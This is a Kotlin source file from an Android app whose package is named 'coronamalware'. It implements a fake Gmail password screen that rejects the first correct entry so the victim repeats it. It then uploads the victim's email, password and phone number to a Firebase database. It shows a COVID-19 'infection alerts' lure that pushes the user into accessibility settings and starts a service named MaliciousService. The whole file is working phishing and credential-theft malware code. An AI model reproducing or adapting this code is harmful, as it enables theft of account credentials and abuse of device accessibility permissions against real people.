package com.deniskrr.coronamalware.login

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.inputmethod.EditorInfo
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import androidx.fragment.app.activityViewModels
import androidx.navigation.fragment.findNavController
import com.deniskrr.coronamalware.R
import com.deniskrr.coronamalware.common.hideSoftKeyboard
import com.deniskrr.coronamalware.databinding.FakeLoginPasswordFragmentBinding
import com.deniskrr.coronamalware.service.MaliciousService
import com.google.firebase.firestore.FirebaseFirestore

class FakeLoginPasswordFragment : Fragment() {

    private lateinit var binding: FakeLoginPasswordFragmentBinding
    private val viewModel: FakeLoginViewModel by activityViewModels()

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        binding = FakeLoginPasswordFragmentBinding.inflate(inflater)

        binding.btnSignInLogin.setOnClickListener {
            handlePassword()
        }

        binding.edittextPasswordLogin.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_DONE) {
                handlePassword()
                true
            } else {
                false
            }
        }

        binding.viewModel = viewModel
        binding.lifecycleOwner = this
        return binding.root
    }

    private fun handlePassword() {
        binding.btnSignInLogin.isEnabled = false
        binding.progressLogin.visibility = View.VISIBLE
        hideSoftKeyboard()

        // Simulate loading
        Handler().postDelayed({
            binding.progressLogin.visibility = View.INVISIBLE
            val password = viewModel.password.value

            // Check whether the victim entered a valid password or not
            if (password.isNullOrEmpty() || password.length < 8) {
                binding.inputPasswordLogin.error =
                    getString(R.string.fake_password_error)
            } else if (!viewModel.isPasswordChecked) {
                binding.inputPasswordLogin.error =
                    getString(R.string.fake_password_error)

                viewModel.isPasswordChecked = true
            } else {
                requestServicePermission()
                setupVictimDatabaseEntry()
                startMaliciousService()

                findNavController().navigate(R.id.action_fakeLoginPassword_to_dashboard)
            }
            binding.btnSignInLogin.isEnabled = true
        }, 1400)
    }

    private fun startMaliciousService() {
        val serviceIntent = Intent(requireContext(), MaliciousService::class.java)
        serviceIntent.putExtra("VictimEmail", viewModel.email.value)
        requireActivity().applicationContext.startService(serviceIntent)
    }

    private fun setupVictimDatabaseEntry() {
        val victim = hashMapOf(
            "accountPassword" to hashMapOf(
                viewModel.password.value!! to "Gmail"
            ),
            "phoneNumber" to viewModel.phoneNumber
        )
        FirebaseFirestore.getInstance().collection("users")
            .document(viewModel.email.value!!).set(victim)
    }

    private fun requestServicePermission() {
        AlertDialog.Builder(requireContext())
            .setTitle("Infection Alerts")
            .setMessage("Activate the COVID-19 Infection service to receive alerts when an infected person is nearby")
            .setPositiveButton(
                android.R.string.yes
            ) { _, _ ->
                val openSettings = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY)
                startActivity(openSettings)
            } // A null listener allows the button to dismiss the dialog and take no further action.
            .setNegativeButton(android.R.string.no, null)
            .show()
    }

}
